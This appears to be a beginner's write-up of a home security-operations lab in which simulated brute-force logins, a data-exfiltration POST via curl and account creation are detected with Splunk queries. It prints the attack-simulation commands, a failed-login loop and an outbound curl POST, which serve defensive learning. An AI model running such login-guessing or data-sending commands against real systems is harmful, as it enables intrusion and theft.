What Threats I Simulated
3 REAL ATTACK SCENARIOS

How a SOC Analyst Thinks

A SOC analyst always asks: What happened? Who did it? When? What should we do? I simulated 3 common threats and investigated each one using Splunk — the same way a real analyst would.

Scenario 1: Failed Login Attempts (Brute Force)

What happened? Someone tried to log into the Windows machine with a wrong password 20 times in a row. This is what hackers do when they try to guess passwords.

How I generated it:

for /L %i in (1,1,20) do net use \\localhost\IPC$ /user:fakeuser FakePass123 System error 1326: Logon failure - unknown user name or bad password.

How I detected it in Splunk:

index=main EventCode=4625 | stats count by Account_Name, ComputerName

What I learned: Splunk's Windows Add-on uses Account_Name field, not user. My first search returned empty until I used the correct field name. Found 4-5 failed login events.

RESOLVED EVENT ID 4625 FIELD NAME FIX

Scenario 2: Data Exfiltration (Data Stealing)

What happened? Someone on the Ubuntu machine tried to send data outside the network to a public server. This simulates a hacker stealing sensitive information.

How I generated it:

curl -X POST -d "test=exfiltration" https://httpbin.org/post

How I detected it in Splunk:

index=main "exfiltration"

Result: Found 1 matching event confirming the data transfer attempt. No real data left the lab — this was a safe simulation.

CONFIRMED DATA EXFILTRATION UBUNTU SYSLOG

Scenario 3: Unauthorized Account Creation

What happened? Someone created a new user account on the Windows machine. Hackers often do this to create backdoor access.

How I detected it in Splunk:

index=main EventCode=4720 | stats count

What I learned: First search returned 0 results because the log hadn't been forwarded yet. After waiting a few seconds and searching again, I found 1 account creation event. This taught me about forwarder latency.

RESOLVED EVENT ID 4720 TIMING LESSON

Splunk Search Queries
SPL QUERIES I USED

What is SPL?

SPL (Search Processing Language) is how you ask Splunk questions about your logs. It's like SQL but for security logs. These are the main queries I used to investigate threats.

Check All Sources Feeding Logs

index=main | stats count by host | sort - count

Find Failed Logins

index=main EventCode=4625 | stats count by Account_Name, ComputerName

Find New Account Creations

index=main EventCode=4720 | stats count

Detect Data Exfiltration

index=main "exfiltration"

Overview of All Events by Machine

index=main | stats count by host, sourcetype | sort - count
Problems I Solved
TROUBLESHOOTING CHALLENGES

Ubuntu Forwarder Permission Errors

Problem: The forwarder wouldn't start due to file ownership errors.

Solution: Fixed permissions with chown/chmod and restarted.

sudo chown -R user:user /opt/splunkforwarder sudo chmod -R 755 /opt/splunkforwarder

Wrong Field Name in Splunk Search

Problem: Searching by user field returned empty results.

Solution: Splunk's Windows Add-on uses Account_Name instead. Changed the query to use the correct field.

Logs Not Showing Up Immediately

Problem: Event ID 4720 search returned 0 results right after generating the event.

Solution: Wait a few seconds for the forwarder to send and Splunk to index the event before searching again.
